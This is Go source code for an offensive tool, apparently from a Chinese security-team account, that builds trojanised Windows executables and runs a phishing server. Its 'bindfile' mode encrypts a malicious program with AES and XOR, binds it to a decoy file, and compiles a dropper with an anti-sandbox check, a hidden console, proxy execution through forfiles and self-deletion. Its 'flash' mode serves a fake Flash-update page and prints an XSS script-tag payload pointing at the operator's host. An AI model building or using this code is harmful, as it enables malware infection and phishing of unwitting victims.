package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path"
	"strings"
	"time"
)

// +++++++++++++++++++++ 随机文件名称 ++++++++++
func randomFilename() string {
	rand.Seed(time.Now().UnixNano()) // 设置随机种子
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	filename := make([]byte, 10) // 生成 10 个字符的随机字符串
	for i := range filename {
		filename[i] = chars[rand.Intn(len(chars))]
	}
	return string(filename)
}

// +++++++++++++++++++++  加密+++++++++++++++
const encryptionKey = 0xBC // 固定的 XOR 密钥

// xorEncrypt 对输入数据进行 XOR 加密
func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i, b := range data {
		encrypted[i] = b ^ encryptionKey
	}
	return encrypted
}

// aesEncrypt 使用 AES 加密数据，使用随机生成的 AES 密钥
func aesEncrypt(data []byte) ([]byte, []byte, []byte, error) {
	// 生成一个随机 AES 密钥
	aesKey := make([]byte, 32) // AES-256 使用 32 字节密钥
	_, err := rand.Read(aesKey)
	if err != nil {
		return nil, nil, nil, err
	}

	// 创建 AES 加密块
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, nil, nil, err
	}

	// 初始化 AES 的块加密模式（使用 CBC 模式）
	blockSize := block.BlockSize()
	iv := make([]byte, blockSize) // 初始化向量（IV）
	_, err = rand.Read(iv)
	if err != nil {
		return nil, nil, nil, err
	}

	// 对数据进行填充，使其长度为块大小的倍数
	paddedData := pad(data, blockSize)

	// 创建一个新的 CBC 模式加密器
	cbc := cipher.NewCBCEncrypter(block, iv)
	encryptedData := make([]byte, len(paddedData))
	cbc.CryptBlocks(encryptedData, paddedData)

	// 返回加密数据、AES密钥和IV
	return encryptedData, aesKey, iv, nil
}

// pad 数据至块大小倍数（PKCS7 填充）
func pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	paddedData := append(data, byte(padding))
	for i := 1; i < padding; i++ {
		paddedData = append(paddedData, byte(padding))
	}
	return paddedData
}

// toHex 将字节数组转换为十六进制字符串
func toHex(data []byte) string {
	return hex.EncodeToString(data)
}

// hexEncode 将字节数组转换为十六进制字符串
func hexEncode(data []byte) string {
	return toHex(data)
}

func SplitHex(data []byte) string {
	hexString := fmt.Sprintf("%x", data)
	splitJoin := strings.Join(strings.Split(hexString, ""), "', '")
	result := fmt.Sprintf("string([]byte{'%s'})", splitJoin)
	return result
}

// +++++++++++++++++++++  加密+++++++++++++++

// +++++++++++++++ 模板定义 +++++++++++++++
var T3y_Templete = `
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

// ++++++++++++ 禁用窗口 +++++++++++
func HideConsole() {
	hwnd, _, _ := syscall.NewLazyDLL(string([]byte{
		'k', 'e', 'r', 'n', 'e', 'l', '3', '2',
	})).NewProc(string([]byte{
		'G', 'e', 't', 'C', 'o', 'n', 's', 'o', 'l', 'e', 'W', 'i', 'n', 'd', 'o', 'w',
	})).Call()
	syscall.NewLazyDLL(string([]byte{
		'u', 's', 'e', 'r', '3', '2',
	})).NewProc(string([]byte{
		'S', 'h', 'o', 'w', 'W', 'i', 'n', 'd', 'o', 'w',
	})).Call(hwnd, 0)
}

// ++++++++++++ 反沙箱 ++++++++++
func checkCPUCores() bool {
	numCPU := runtime.NumCPU()
	if numCPU > 4 {
		return true
	}
	return false
}

// +++++++++++ cmd ++++++++++
func cmd_exec(command string) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	CreateProcess := kernel32.NewProc("CreateProcessW")

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))

	commandPtr, _ := syscall.UTF16PtrFromString(command)

	ret, _, err := CreateProcess.Call(
		0,
		uintptr(unsafe.Pointer(commandPtr)), // Command line
		0,
		0,
		0,
		0x08000000, // CREATE_NEW_CONSOLE flag
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		fmt.Println("Failed to start process:", err)
	} else {
		fmt.Println("Process started successfully")
	}
}


const encryptionKey = 0xBC
func xorDecrypt(data []byte) []byte {
	decrypted := make([]byte, len(data))
	for i, b := range data {
		decrypted[i] = b ^ encryptionKey
	}
	return decrypted
}

func aesDecrypt(encryptedData, aesKey, iv []byte) ([]byte, error) {
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()

	cbc := cipher.NewCBCDecrypter(block, iv)
	decryptedData := make([]byte, len(encryptedData))
	cbc.CryptBlocks(decryptedData, encryptedData)

	// 去掉填充
	decryptedData = unpad(decryptedData, blockSize)
	return decryptedData, nil
}

func unpad(data []byte, blockSize int) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}
func main() {

	if checkCPUCores() {
	} else {
		os.Exit(0)
	}
	HideConsole()

	bindFileName := "%s"
	bindData := %s
	FileName := "%s"
	encryptedDataHex := "%s"
	randomKeyHex := "%s"
	tagerFile := "%s"
	iv, _ := hex.DecodeString("%s")

	encryptedDataByte, err := hex.DecodeString(encryptedDataHex)
	if err != nil {
		return
	}
	randomKeyByte, err := hex.DecodeString(randomKeyHex)
	if err != nil {
		return
	}

	DecryptedData := xorDecrypt(encryptedDataByte)
	DecryptedKey := xorDecrypt(randomKeyByte)

	DecryptedDataFinal, err := aesDecrypt(DecryptedData, DecryptedKey, iv)
	if err != nil {
		return
	}

	bindFileData, _ := hex.DecodeString(bindData)
	bindFilePath := os.Getenv("USERPROFILE") + "\\Documents\\" + bindFileName

	ioutil.WriteFile(bindFilePath, bindFileData, 0777)
	cmd_exec("cmd.exe /c  start " + bindFilePath)

	tmpGoFileSource := os.Getenv("USERPROFILE") + "\\Documents\\" + FileName + ".spl"
	FileCopy := os.Getenv("USERPROFILE") + "\\Documents\\" + FileName + ".exe"

	ioutil.WriteFile(tmpGoFileSource, DecryptedDataFinal, 0777)

	cmd_exec("expand " + tmpGoFileSource + " " + FileCopy)

	cmd_exec("forfiles /p c:\\windows\\system32 /m calc.exe /c \"cmd /c " + FileCopy)
	dir, _ := os.Getwd()
	cmd_exec("cmd.exe /c del " + dir + "\\" + tagerFile)
}
`

// +++++++++++++++ bindfile ++++++++++++
func BindFile(evilFile string, bindname string) {
	new_Out := randomFilename() + ".exe"

	println(`
███████╗██████╗ ███████╗
╚══███╔╝██╔══██╗╚══███╔╝
  ███╔╝ ██████╔╝  ███╔╝ 
 ███╔╝  ██╔═══╝  ███╔╝  
███████╗██║     ███████╗
╚══════╝╚═╝     ╚══════╝ 
 ____    _               _   _____    _   _        
 | __ )  (_)  _ __     __| | |  ___| (_) | |   ___ 
 |  _ \  | | | '_ \   / _  | | |_    | | | |  / _ \
 | |_) | | | | | | | | (_| | |  _|   | | | | |  __/
 |____/  |_| |_| |_|  \__,_| |_|     |_| |_|  \___|
                                     公众号：zeroPointzero安全团队`)
	println("[*] Evil Program: " + evilFile)
	println("[*] Bind File: " + bindname)
	println("[*] Output File: " + new_Out)

	evilFileSuffix := strings.TrimSuffix(evilFile, path.Ext(evilFile))
	evilProgramData, err := ioutil.ReadFile(evilFile)

	tmpGoTe := "./tmp.go"
	if err != nil {
		fmt.Println("[!] Error reading evil program:", err)
		return
	}
	//绑定文件数据
	binData, _ := ioutil.ReadFile(bindname)
	bindFileHex := SplitHex(binData)

	// 执行 AES 加密
	encryptedData, randomKey, iv, err := aesEncrypt(evilProgramData)
	if err != nil {
		fmt.Println("[!] AES encryption error:", err)
		return
	}

	// 执行 XOR 加密
	xor_encryptedData := xorEncrypt(encryptedData)
	xor_randomKey := xorEncrypt(randomKey)

	// 将加密后的数据和密钥转为十六进制表示
	encryptedDataHex := hexEncode(xor_encryptedData)
	randomKeyHex := hexEncode(xor_randomKey)
	ivHex := hex.EncodeToString(iv) // 也转换IV为十六进制字符串

	// 输出加密后的数据和密钥
	fmt.Println("Random Key: " + randomKeyHex)
	fmt.Println("IV: " + ivHex)

	tmpGoFileSource := fmt.Sprintf(T3y_Templete, bindname, bindFileHex, evilFileSuffix, encryptedDataHex, randomKeyHex, new_Out, ivHex)

	ioutil.WriteFile(tmpGoTe, []byte(tmpGoFileSource), 0777)

	err = exec.Command("go", "build", "-ldflags", "-w -s -H=windowsgui", "--trimpath", "-o", new_Out, tmpGoTe).Run()

	os.Remove(tmpGoTe)
	if err != nil {
		println("[!] Compile fail: " + err.Error())
		return
	}

	println("[+] Compile success: " + new_Out)
}

// +++++++++++++++ FLash ++++++++++++
func logRequest(r *http.Request) {
	// 获取请求的 IP 地址
	ip := r.RemoteAddr
	// 获取当前时间
	timestamp := time.Now().Format(time.RFC1123)
	// 打印日志：IP 和时间
	log.Printf("Request from IP: %s at %s\n", ip, timestamp)
}

func Flash(ip string, port string) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		// 记录请求的 IP 和时间
		logRequest(r)
		// 返回 ./fake_flash_domain 目录下的静态文件
		http.ServeFile(w, r, "./fake_flash_domain"+r.URL.Path)
	})

	// /dsacasdwqweqwewqdcz/ 路由处理
	http.HandleFunc("/dsacasdwqweqwewqdcz/", func(w http.ResponseWriter, r *http.Request) {
		// 记录请求的 IP 和时间
		logRequest(r)
		// 返回 ./fake_user 目录下的静态文件
		http.ServeFile(w, r, "./fake_user"+r.URL.Path[len("/dsacasdwqweqwewqdcz"):])
	})

	println(`
███████╗██████╗ ███████╗
╚══███╔╝██╔══██╗╚══███╔╝
  ███╔╝ ██████╔╝  ███╔╝ 
 ███╔╝  ██╔═══╝  ███╔╝  
███████╗██║     ███████╗
╚══════╝╚═╝     ╚══════╝    
_____   _          _      ____    _   _ 
|  ___| | |        / \    / ___|  | | | |
| |_    | |       / _ \   \___ \  | |_| |
|  _|   | |___   / ___ \   ___) | |  _  |
|_|     |_____| /_/   \_\ |____/  |_| |_|

							公众号：zeroPointzero安全团队`)
	// 启动 HTTP 服务
	log.Println("Server starting on", ip+":"+port)

	// 打印服务地址信息
	log.Println("[+] /fake_user: http://" + ip + ":" + port + "/dsacasdwqweqwewqdcz/")
	log.Println("[+] /fake_flash_domain: http://" + ip + ":" + port)

	fmt.Println("[+] 请插入xss payload : <script src='" + "http://" + ip + ":" + port + "/dsacasdwqweqwewqdcz/flash.js'></script>")
	fmt.Println("[+] 诱饵请放置在 fake_flash_domain 目录下 ------------------")

	// 启动服务器并监听指定端口
	err := http.ListenAndServe(ip+":"+port, nil)
	if err != nil {
		log.Fatal(err)
	}
}

func main() {

	if len(os.Args) != 4 {
		println(`
███████╗██████╗ ███████╗
╚══███╔╝██╔══██╗╚══███╔╝
  ███╔╝ ██████╔╝  ███╔╝ 
 ███╔╝  ██╔═══╝  ███╔╝  
███████╗██║     ███████╗
╚══════╝╚═╝     ╚══════╝ 
							公众号：zeroPointzero安全团队`)
		println("\nUsage:\n    " + os.Args[0] + " <bindfile/flash/msi/flag> <evil_program/ip/...> <bind_file/port/...>")
		fmt.Println("[*] 安全的本质就是服务")

		if os.Args[1] == "flag" {
			fmt.Println("[*] 不懂如何构建话术永远也不会有人上钩，追女孩也是如此")
		}
		return
	}

	switch os.Args[1] {
	case "bindfile":
		evilFile := os.Args[2]
		bindname := os.Args[3]
		BindFile(evilFile, bindname)
		break
	case "flash":
		ip := os.Args[2]
		port := os.Args[3]
		Flash(ip, port)
		break
	case "msi":
		break
	}
	return
}
